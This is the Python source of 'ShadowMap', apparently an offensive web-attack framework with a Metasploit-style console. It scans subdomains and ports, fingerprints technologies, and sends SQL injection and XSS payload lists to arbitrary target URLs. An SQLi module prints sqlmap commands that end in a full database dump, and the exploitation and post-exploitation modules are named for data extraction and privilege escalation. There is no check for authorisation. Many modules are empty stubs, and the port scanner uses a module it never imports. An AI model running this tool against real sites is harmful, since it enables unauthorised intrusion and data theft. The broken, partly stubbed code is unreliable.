#!/usr/bin/env python3
"""
ShadowMap-Scanner v1.0 - Framework

Author: BlackPearl42
"""

import sys
import os
import requests
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from colorama import Fore, Style, init
import urllib3
from urllib3.exceptions import InsecureRequestWarning
import tldextract
import json
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import dns.resolver
import readline
import cmd
import sqlite3
from datetime import datetime

os.system('clear') 

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
urllib3.disable_warnings(InsecureRequestWarning)

class ModuleManager:
    """Metasploit-style module management system"""
    
    def __init__(self):
        self.modules = {}
        self.load_modules()
    
    def load_modules(self):
        """Load all available modules"""
        # Reconnaissance Modules
        self.modules['recon'] = {
            'subdomain_scan': SubdomainScanner(),
            'tech_detection': TechnologyDetector(),
            'port_scan': PortScanner(),
            'directory_brute': DirectoryBruter(),
            'endpoint_discovery': EndpointDiscoverer()
        }
        
        # Vulnerability Scanning Modules
        self.modules['vuln_scan'] = {
            'sqli_detector': SQLiDetector(),
            'xss_detector': XSSDetector(),
            'rce_detector': RCEDetector(),
            'lfi_detector': LFIDetector(),
            'ssrf_detector': SSRFTester(),
            'xxe_detector': XXEDetector()
        }
        
        # Exploitation Modules
        self.modules['exploit'] = {
            'sqli_exploit': SQLiExploiter(),
            'xss_exploit': XSSExploiter(),
            'file_upload': FileUploadExploiter(),
            'auth_bypass': AuthBypassTester()
        }
        
        # Post-Exploitation Modules
        self.modules['post'] = {
            'data_extractor': DataExtractor(),
            'backdoor_check': BackdoorChecker(),
            'privilege_escalation': PrivEscChecker()
        }
    
    def list_modules(self, category=None):
        """List all available modules"""
        if category and category in self.modules:
            print(f"\n{Fore.CYAN}[{category.upper()} MODULES]")
            print("=" * 50)
            for name, module in self.modules[category].items():
                print(f"  {Fore.GREEN}{name:<20} {Fore.WHITE}- {module.description}")
        else:
            for category, modules in self.modules.items():
                print(f"\n{Fore.CYAN}[{category.upper()} MODULES]")
                print("-" * 40)
                for name, module in modules.items():
                    print(f"  {Fore.GREEN}{name:<20} {Fore.WHITE}- {module.description}")
    
    def use_module(self, module_path):
        """Use a specific module"""
        try:
            category, module_name = module_path.split('/')
            if category in self.modules and module_name in self.modules[category]:
                return self.modules[category][module_name]
            else:
                print(Fore.RED + f"[!] Module not found: {module_path}")
                return None
        except ValueError:
            print(Fore.RED + "[!] Invalid module path. Use: category/module_name")
            return None

class BaseModule:
    """Base class for all modules"""
    
    def __init__(self):
        self.options = {}
        self.session = requests.Session()
        self.description = "Base module"
        self.author = "ShadowMap Team"
    
    def show_options(self):
        """Show module options"""
        print(f"\n{Fore.CYAN}Module Options:")
        print("=" * 40)
        for opt, value in self.options.items():
            print(f"  {Fore.GREEN}{opt:<20} {Fore.WHITE}{value}")
    
    def set_option(self, option, value):
        """Set module option"""
        if option in self.options:
            self.options[option] = value
            print(Fore.GREEN + f"[+] {option} => {value}")
        else:
            print(Fore.RED + f"[!] Invalid option: {option}")
    
    def run(self):
        """Run the module - to be implemented by subclasses"""
        raise NotImplementedError("Subclasses must implement run() method")

# ========== RECONNAISSANCE MODULES ==========

class SubdomainScanner(BaseModule):
    """Advanced subdomain discovery module"""
    
    def __init__(self):
        super().__init__()
        self.description = "Comprehensive subdomain enumeration"
        self.options = {
            'RHOSTS': '',
            'THREADS': '10',
            'WORDLIST': 'common_subdomains.txt',
            'OUTPUT_FILE': ''
        }
    
    def run(self):
        if not self.options['RHOSTS']:
            print(Fore.RED + "[!] RHOSTS option required")
            return
        
        target = self.options['RHOSTS']
        print(Fore.CYAN + f"\n[+] Starting subdomain scan for: {target}")
        
        # Common subdomains list
        common_subs = [
            'www', 'api', 'admin', 'test', 'dev', 'staging', 'mail',
            'ftp', 'blog', 'shop', 'store', 'app', 'mobile', 'cdn',
            'secure', 'portal', 'login', 'dashboard', 'api', 'graphql'
        ]
        
        found_subdomains = []
        
        with ThreadPoolExecutor(max_workers=int(self.options['THREADS'])) as executor:
            futures = {
                executor.submit(self.check_subdomain, f"{sub}.{target}"): sub 
                for sub in common_subs
            }
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found_subdomains.append(result)
                    print(Fore.GREEN + f"[+] Found: {result}")
        
        print(Fore.CYAN + f"\n[+] Scan completed. Found {len(found_subdomains)} subdomains")
        
        if self.options['OUTPUT_FILE']:
            with open(self.options['OUTPUT_FILE'], 'w') as f:
                for sub in found_subdomains:
                    f.write(sub + '\n')
            print(Fore.GREEN + f"[+] Results saved to: {self.options['OUTPUT_FILE']}")
    
    def check_subdomain(self, subdomain):
        try:
            response = self.session.get(f"https://{subdomain}", timeout=5, verify=False)
            if response.status_code < 400:
                return subdomain
        except:
            try:
                response = self.session.get(f"http://{subdomain}", timeout=5, verify=False)
                if response.status_code < 400:
                    return subdomain
            except:
                pass
        return None

class TechnologyDetector(BaseModule):
    """Technology stack detection module"""
    
    def __init__(self):
        super().__init__()
        self.description = "Detect technologies and frameworks"
        self.options = {
            'RHOSTS': '',
            'DEEP_SCAN': 'true'
        }
    
    def run(self):
        if not self.options['RHOSTS']:
            print(Fore.RED + "[!] RHOSTS option required")
            return
        
        target = self.options['RHOSTS']
        print(Fore.CYAN + f"\n[+] Detecting technologies for: {target}")
        
        try:
            response = self.session.get(target, timeout=10, verify=False)
            technologies = self.analyze_technologies(response)
            
            print(Fore.GREEN + "\n[+] Detected Technologies:")
            for tech in technologies:
                print(Fore.WHITE + f"  - {tech}")
                
        except Exception as e:
            print(Fore.RED + f"[!] Error: {e}")
    
    def analyze_technologies(self, response):
        technologies = []
        
        # Server detection
        server = response.headers.get('Server', '')
        if server:
            technologies.append(f"Server: {server}")
        
        # Framework detection
        if 'X-Powered-By' in response.headers:
            technologies.append(f"Powered By: {response.headers['X-Powered-By']}")
        
        # CMS detection
        content = response.text.lower()
        if 'wp-content' in content:
            technologies.append("CMS: WordPress")
        elif 'drupal' in content:
            technologies.append("CMS: Drupal")
        elif 'joomla' in content:
            technologies.append("CMS: Joomla")
        
        # JavaScript frameworks
        if 'react' in content:
            technologies.append("Framework: React")
        if 'angular' in content:
            technologies.append("Framework: Angular")
        if 'vue' in content:
            technologies.append("Framework: Vue.js")
        
        return technologies

class PortScanner(BaseModule):
    """Basic port scanning module"""
    
    def __init__(self):
        super().__init__()
        self.description = "TCP port scanning"
        self.options = {
            'RHOSTS': '',
            'PORTS': '80,443,22,21,25,53,110,143,993,995,3389,5900',
            'THREADS': '20'
        }
    
    def run(self):
        if not self.options['RHOSTS']:
            print(Fore.RED + "[!] RHOSTS option required")
            return
        
        target = self.options['RHOSTS']
        ports = [int(p.strip()) for p in self.options['PORTS'].split(',')]
        
        print(Fore.CYAN + f"\n[+] Scanning {target} on {len(ports)} ports")
        
        open_ports = []
        
        with ThreadPoolExecutor(max_workers=int(self.options['THREADS'])) as executor:
            futures = {executor.submit(self.scan_port, target, port): port for port in ports}
            
            for future in as_completed(futures):
                port, is_open = future.result()
                if is_open:
                    open_ports.append(port)
                    print(Fore.GREEN + f"[+] Port {port}/tcp open")
        
        print(Fore.CYAN + f"\n[+] Found {len(open_ports)} open ports")
    
    def scan_port(self, target, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            sock.close()
            return port, result == 0
        except:
            return port, False

# ========== VULNERABILITY SCANNING MODULES ==========

class SQLiDetector(BaseModule):
    """SQL Injection detection module"""
    
    def __init__(self):
        super().__init__()
        self.description = "Detect SQL injection vulnerabilities"
        self.options = {
            'RHOSTS': '',
            'PARAMETERS': 'id,user,page,search,category',
            'METHOD': 'GET',
            'PAYLOAD_FILE': 'sqli_payloads.txt'
        }
        self.payloads = [
            "admin'#" ,  "'", "''", "`", "``", "' OR '1'='1", "' OR 1=1--",
            "admin'--", "1' ORDER BY 1--", "1' UNION SELECT 1,2,3--"
        ]
    
    def run(self):
        if not self.options['RHOSTS']:
            print(Fore.RED + "[!] RHOSTS option required")
            return
        
        target = self.options['RHOSTS']
        parameters = [p.strip() for p in self.options['PARAMETERS'].split(',')]
        
        print(Fore.CYAN + f"\n[+] Testing SQLi on {target}")
        print(Fore.CYAN + f"[+] Parameters: {', '.join(parameters)}")
        
        vulnerabilities = []
        
        for param in parameters:
            for payload in self.payloads:
                try:
                    if self.options['METHOD'].upper() == 'GET':
                        test_url = f"{target}?{param}={payload}"
                        response = self.session.get(test_url, timeout=5, verify=False)
                    else:
                        data = {param: payload}
                        response = self.session.post(target, data=data, timeout=5, verify=False)
                    
                    if self.is_vulnerable(response.text):
                        vulnerabilities.append((param, payload))
                        print(Fore.RED + f"[VULN] SQLi found in {param} with payload: {payload}")
                        
                except Exception as e:
                    continue
        
        if vulnerabilities:
            print(Fore.RED + f"\n[!] Found {len(vulnerabilities)} SQL injection vulnerabilities")
        else:
            print(Fore.GREEN + "[+] No SQL injection vulnerabilities found")
    
    def is_vulnerable(self, response_text):
        error_indicators = [
            'mysql_fetch_array', 'ORA-', 'SQLServer', 'PostgreSQL',
            'syntax error', 'warning', 'database', 'query failed'
        ]
        return any(error in response_text.lower() for error in error_indicators)

class XSSDetector(BaseModule):
    """XSS detection module"""
    
    def __init__(self):
        super().__init__()
        self.description = "Detect Cross-Site Scripting vulnerabilities"
        self.options = {
            'RHOSTS': '',
            'PARAMETERS': 'search,q,query,keyword,name,message',
            'METHOD': 'GET'
        }
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "\"><script>alert(1)</script>"
        ]
    
    def run(self):
        if not self.options['RHOSTS']:
            print(Fore.RED + "[!] RHOSTS option required")
            return
        
        target = self.options['RHOSTS']
        parameters = [p.strip() for p in self.options['PARAMETERS'].split(',')]
        
        print(Fore.CYAN + f"\n[+] Testing XSS on {target}")
        
        vulnerabilities = []
        
        for param in parameters:
            for payload in self.payloads:
                try:
                    if self.options['METHOD'].upper() == 'GET':
                        test_url = f"{target}?{param}={payload}"
                        response = self.session.get(test_url, timeout=5, verify=False)
                    else:
                        data = {param: payload}
                        response = self.session.post(target, data=data, timeout=5, verify=False)
                    
                    if payload in response.text:
                        vulnerabilities.append((param, payload))
                        print(Fore.RED + f"[VULN] XSS found in {param} with payload: {payload}")
                        
                except Exception as e:
                    continue
        
        if vulnerabilities:
            print(Fore.RED + f"\n[!] Found {len(vulnerabilities)} XSS vulnerabilities")
        else:
            print(Fore.GREEN + "[+] No XSS vulnerabilities found")

class RCEDetector(BaseModule):
    """Remote Code Execution detection module"""

    def __init__(self):
        super().__init__()
        self.description = "Detect Remote Code Execution vulnerabilities"
        self.options = {
            'RHOSTS': '',
            'PARAMETERS': 'cmd,command,exec,execute,code',
            'METHOD': 'GET'
        }
    
    def run(self):
        print(Fore.CYAN + "\n[+] RCE Detection Module")
        # Implementation for RCE detection
        pass

# ========== EXPLOITATION MODULES ==========

class SQLiExploiter(BaseModule):
    """SQL Injection exploitation module"""
    
    def __init__(self):
        super().__init__()
        self.description = "Exploit SQL injection vulnerabilities"
        self.options = {
            'RHOSTS': '',
            'PARAMETER': 'id',
            'METHOD': 'GET',
            'DB_TYPE': 'mysql'
        }
    
    def run(self):
        print(Fore.CYAN + "\n[+] SQLi Exploitation Module")
        target = self.options['RHOSTS']
        param = self.options['PARAMETER']
        
        print(Fore.YELLOW + f"[*] Generating SQLMap commands for exploitation:")
        print(Fore.WHITE + f"    sqlmap -u \"{target}?{param}=1\" --batch --level=3 --risk=2")
        print(Fore.WHITE + f"    sqlmap -u \"{target}?{param}=1\" --dbms={self.options['DB_TYPE']} --dbs")
        print(Fore.WHITE + f"    sqlmap -u \"{target}?{param}=1\" --dbms={self.options['DB_TYPE']} --tables")
        print(Fore.WHITE + f"    sqlmap -u \"{target}?{param}=1\" --dbms={self.options['DB_TYPE']} --dump-all")

class XSSExploiter(BaseModule):
    """XSS exploitation module"""
    
    def __init__(self):
        super().__init__()
        self.description = "Generate XSS exploitation payloads"
        self.options = {
            'RHOSTS': '',
            'PARAMETER': 'search',
            'CONTEXT': 'html'
        }
    
    def run(self):
        print(Fore.CYAN + "\n[+] XSS Exploitation Module")
        
        contexts = {
            'html': [
                "<script>alert(document.domain)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>"
            ],
            'attribute': [
                "\" onmouseover=\"alert(1)",
                "' onfocus='alert(1)",
                " javascript:alert(1)"
            ],
            'javascript': [
                "';alert(1)//",
                "\";alert(1)//",
                "`;alert(1)//"
            ]
        }
        
        context = self.options['CONTEXT']
        if context in contexts:
            print(Fore.YELLOW + f"[*] XSS Payloads for {context} context:")
            for payload in contexts[context]:
                print(Fore.WHITE + f"    {payload}")

# ========== POST-EXPLOITATION MODULES ==========

class DataExtractor(BaseModule):
    """Data extraction module"""
    
    def __init__(self):
        super().__init__()
        self.description = "Extract sensitive data from target"
        self.options = {
            'RHOSTS': '',
            'DATA_TYPES': 'emails,phones,api_keys,jwt_tokens'
        }
    
    def run(self):
        print(Fore.CYAN + "\n[+] Data Extraction Module")
        # Implementation for data extraction
        pass

class ShadowMapConsole(cmd.Cmd):
    """Metasploit-style interactive console"""
    
    def __init__(self):
        super().__init__()
        self.prompt = f"{Fore.RED}shadowmap{Fore.WHITE} > "
        self.module_manager = ModuleManager()
        self.current_module = None
        self.target = None
        
    def do_banner(self, args):
        """Display the banner"""
        print_banner()
    
    def do_search(self, args):
        """Search for modules"""
        if args:
            for category, modules in self.module_manager.modules.items():
                for name, module in modules.items():
                    if args.lower() in name.lower() or args.lower() in module.description.lower():
                        print(f"{Fore.GREEN}{category}/{name:<25} {Fore.WHITE}- {module.description}")
        else:
            print(Fore.RED + "[!] Usage: search <term>")
    
    def do_use(self, args):
        """Use a specific module"""
        if not args:
            print(Fore.RED + "[!] Usage: use <module_path>")
            return
        
        self.current_module = self.module_manager.use_module(args)
        if self.current_module:
            self.prompt = f"{Fore.RED}shadowmap{Fore.WHITE}({Fore.GREEN}{args}{Fore.WHITE}) > "
            print(Fore.GREEN + f"[+] Using module: {args}")
            self.current_module.show_options()
    
    def do_set(self, args):
        """Set module option"""
        if not self.current_module:
            print(Fore.RED + "[!] No module selected. Use 'use <module>' first.")
            return
        
        try:
            option, value = args.split(' ', 1)
            self.current_module.set_option(option.upper(), value)
        except ValueError:
            print(Fore.RED + "[!] Usage: set <option> <value>")
    
    def do_show(self, args):
        """Show options, modules, or info"""
        if args == 'options':
            if self.current_module:
                self.current_module.show_options()
            else:
                print(Fore.RED + "[!] No module selected")
        elif args == 'modules':
            self.module_manager.list_modules()
        elif args == 'info':
            if self.current_module:
                print(f"\n{Fore.CYAN}Module Information:")
                print(f"  Name: {Fore.GREEN}{type(self.current_module).__name__}")
                print(f"  Description: {Fore.WHITE}{self.current_module.description}")
                print(f"  Author: {Fore.WHITE}{self.current_module.author}")
            else:
                print(Fore.RED + "[!] No module selected")
        else:
            print(Fore.RED + "[!] Usage: show <options|modules|info>")
    
    def do_run(self, args):
        """Run the current module"""
        if not self.current_module:
            print(Fore.RED + "[!] No module selected. Use 'use <module>' first.")
            return
        
        try:
            print(Fore.CYAN + "\n[*] Running module...")
            self.current_module.run()
        except Exception as e:
            print(Fore.RED + f"[!] Error running module: {e}")
    
    def do_back(self, args):
        """Go back to main console"""
        self.current_module = None
        self.prompt = f"{Fore.RED}shadowmap{Fore.WHITE} > "
        print(Fore.GREEN + "[+] Back to main console")
    
    def do_set_target(self, args):
        """Set the target for all modules"""
        if args:
            self.target = args
            print(Fore.GREEN + f"[+] Target set to: {args}")
        else:
            print(Fore.RED + "[!] Usage: set_target <url>")
    
    def do_scan(self, args):
        """Run quick comprehensive scan"""
        if not self.target:
            print(Fore.RED + "[!] No target set. Use 'set_target <url>' first.")
            return
        
        print(Fore.CYAN + f"\n[+] Starting comprehensive scan for: {self.target}")
        
        # Run subdomain scan
        print(Fore.YELLOW + "\n[*] Running subdomain scan...")
        sub_module = SubdomainScanner()
        sub_module.options['RHOSTS'] = self.target
        sub_module.run()
        
        # Run technology detection
        print(Fore.YELLOW + "\n[*] Running technology detection...")
        tech_module = TechnologyDetector()
        tech_module.options['RHOSTS'] = self.target
        tech_module.run()
        
        # Run SQLi detection
        print(Fore.YELLOW + "\n[*] Running SQL injection scan...")
        sqli_module = SQLiDetector()
        sqli_module.options['RHOSTS'] = self.target
        sqli_module.run()
        
        # Run XSS detection
        print(Fore.YELLOW + "\n[*] Running XSS scan...")
        xss_module = XSSDetector()
        xss_module.options['RHOSTS'] = self.target
        xss_module.run()
        
        print(Fore.GREEN + "\n[+] Comprehensive scan completed!")
    
    def do_exit(self, args):
        """Exit the console"""
        print(Fore.CYAN + "\n[+] Happy hunting!")
        return True
    
    def do_quit(self, args):
        """Exit the console"""
        return self.do_exit(args)

def print_banner():
    """Print the awesome ASCII art banner"""
    print(Fore.MAGENTA + r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀// [ ShadowMap-Framework v1.0 ]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣠⣄⣤⣠⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣠⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣤⣄⠈⢻⣿⣿⣿⣿⣿⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣿⣿⣿⣿⡅⠀⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣧⣀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⠂⠀⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣈⣻⣿⣿⡀⠘⠻⢿⣿⣿⣿⣿⣿⠟⠛⠛⠃⠀⠐⠻⢿⣿⣿⣿⣿⣿⠟⠁⢀⣴⣿⣿⣿⣷⣶⣶⣶⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠿⣿⣶⣤⡄⠈⠻⠟⠉⢀⣠⣴⣶⣶⣶⣶⣄⠀⠈⠙⠿⠟⠁⣀⣴⣿⠟⠀⠛⠿⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠙⠿⠿⠟⠉⠉⣀⠈⠻⣿⡟⠀⣤⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣠⠀⢸⣿⠟⠁⣠⣶⣤⣀⠈⠉⠉⠁⣠⣾⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢨⣷⣆⣠⣄⣤⣾⣿⣿⣷⡄⠈⠁⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠈⠁⣠⣾⣿⣿⣿⣿⣷⣶⣶⣾⣿⣿⡅⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⢀⣰⣿⣿⣿⠛⠛⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⠛⠁⠀⠀⠀⠀⠙⢻⣿⣿⣿⣿⠟⠻⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡟⠁⠀⠀⠀⢹⣿⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⠀⠘⢿⣷⣄⠀⠀⠀⠀⠀⢠⣼⣿⣿⣷⣄⠀⠀⣠⣾⣿⠃⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠍⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⠀⠈⢿⣿⣷⡀⡀⢀⣸⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⠏⠁⠀⠉⣿⣿⣿⣿⣿⣿⣿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣿⠟⠉⠉⣀⣤⡄⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠠⢼⣷⣄⠈⠻⣿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣷⣤⡀⠀⣠⣼⣿⡿⠟⠁⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢀⡀⠙⢿⣷⣄⠀⢠⣤⣼⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣷⣿⠋⢁⣀⣠⡄⠀⣿⣿⣿⣿⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣷⣄⠀⠙⢿⣷⣾⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⣈⣿⣿⣿⠁⠀⠈⢿⣿⣅⠀⠻⣿⣿⣿⠀⢸⣿⣿⣿⡏⠀⣿⣿⠟⠀⣠⣿⣿⡗⠀⠀⣹⣿⣿⣄⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⠀⠀⠀⠀⠈⡿⣷⣄⠈⠉⠉⢀⠀⡉⠉⠉⠁⠀⠈⠁⣀⣼⣿⠟⠻⠄⠀⠀⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠀⠀⠀⠀⠈⡅⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⠀⠀⡃⠀⠀⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀⠐⡄⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠁⠹⠀⠀⠀⡅⠀⠀⠀⠀⠰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠀⠀⠀⠀⠀⠐⡄⠀⠀⠀⠀⢰⡟⣿⣿⣿⣿⣿⠏⠁⠀⠀⢘⠀⠀⠀⠅⠀⠀⠀⠀⢘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡃⠀⠀⠀⠀⠀⠐⡀⠀⠀⠀⠀⠸⠀⠀⠻⣿⡛⠀⠀⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀⢨⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⢀⡅⠀⠀⠀⠀⢘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢿⡻⠆⠀⠀⠀⢨⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


    """ + Fore.RED + "          // [ MODULAR FRAMEWORK MODE ]\n")
    print(Fore.WHITE + "=" * 60)
    print(Fore.GREEN + "Metasploit-Style Modular Bug Bounty Framework")
    print(Fore.GREEN + "Type 'help' for available commands")
    print(Fore.GREEN + "Type 'show modules' to see all available modules")
    print(Fore.WHITE + "=" * 60)

# Add missing module classes (simplified versions)
class DirectoryBruter(BaseModule):
    def __init__(self): super().__init__(); self.description = "Directory brute forcing"
    def run(self): print(Fore.CYAN + "\n[+] Directory Brute Force Module")

class EndpointDiscoverer(BaseModule):
    def __init__(self): super().__init__(); self.description = "API endpoint discovery"
    def run(self): print(Fore.CYAN + "\n[+] Endpoint Discovery Module")

class LFIDetector(BaseModule):
    def __init__(self): super().__init__(); self.description = "LFI detection"
    def run(self): print(Fore.CYAN + "\n[+] LFI Detection Module")

class SSRFTester(BaseModule):
    def __init__(self): super().__init__(); self.description = "SSRF testing"
    def run(self): print(Fore.CYAN + "\n[+] SSRF Testing Module")

class XXEDetector(BaseModule):
    def __init__(self): super().__init__(); self.description = "XXE detection"
    def run(self): print(Fore.CYAN + "\n[+] XXE Detection Module")

class FileUploadExploiter(BaseModule):
    def __init__(self): super().__init__(); self.description = "File upload exploitation"
    def run(self): print(Fore.CYAN + "\n[+] File Upload Exploitation Module")

class AuthBypassTester(BaseModule):
    def __init__(self): super().__init__(); self.description = "Authentication bypass testing"
    def run(self): print(Fore.CYAN + "\n[+] Auth Bypass Testing Module")

class BackdoorChecker(BaseModule):
    def __init__(self): super().__init__(); self.description = "Backdoor detection"
    def run(self): print(Fore.CYAN + "\n[+] Backdoor Checker Module")

class PrivEscChecker(BaseModule):
    def __init__(self): super().__init__(); self.description = "Privilege escalation checking"
    def run(self): print(Fore.CYAN + "\n[+] Privilege Escalation Checker Module")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="ShadowMap-Framework v1.0")
    parser.add_argument('target', nargs='?', help='Target to scan')
    parser.add_argument('--console', action='store_true', help='Start interactive console')
    
    args = parser.parse_args()
    
    if args.console or not args.target:
        # Start interactive console
        print_banner()
        console = ShadowMapConsole()
        if args.target:
            console.target = args.target
            print(Fore.GREEN + f"[+] Target set to: {args.target}")
        console.cmdloop()
    else:
        # Run quick scan
        print_banner()
        console = ShadowMapConsole()
        console.target = args.target
        console.do_scan('')

if __name__ == "__main__":
    main()
